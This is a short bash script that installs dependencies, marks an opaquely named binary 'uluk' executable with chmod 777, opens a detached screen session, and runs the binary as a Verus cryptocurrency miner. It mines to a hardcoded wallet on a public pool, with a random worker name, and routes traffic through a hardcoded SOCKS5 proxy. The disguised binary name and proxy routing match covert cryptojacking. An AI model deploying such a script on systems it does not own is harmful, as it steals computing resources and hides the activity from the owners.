#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=R9fyZN2rng1biZmim3ThmxiN7PqFETw5CD
WORKER=$(echo $(shuf -i 1-10 -n 1)P)
PROXY=socks5://192.210.231.73:40130
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
